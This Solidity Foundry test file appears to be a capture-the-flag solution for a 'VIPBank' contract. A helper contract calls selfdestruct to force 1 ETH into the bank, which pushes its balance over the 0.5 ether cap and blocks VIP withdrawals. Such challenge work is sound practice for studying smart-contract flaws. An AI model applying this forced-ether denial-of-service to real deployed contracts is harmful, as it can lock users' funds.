// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {VIPBank} from "../../src/vip-bank/vipbank.sol";

contract DummyContract {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
    receive() external payable {}
}

contract VIPBankChallenge is Test {
    VIPBank public vipBank;
    address public attacker;

    function setUp() public {
        vipBank = new VIPBank();
        attacker = address(this);

        // Make the attacker a VIP to allow deposits
        vipBank.addVIP(attacker);

        deal(address(this), 2 ether);
    }

    function testAttack() public {
        // Deploy the DummyContract and fund it with more than maxETH (0.5 ether)
        DummyContract dummy = new DummyContract();
        payable(address(dummy)).transfer(1 ether);  // Fund the dummy contract with 1 ETH
        // Self-destruct the dummy contract, sending 1 ETH to VIPBank
        dummy.attack(payable(address(vipBank)));
        // the requirements of withdraw failed, making vip not able to withdraw
        assert(vipBank.contractBalance() > 0.5 ether);
    }

    receive() external payable {}
}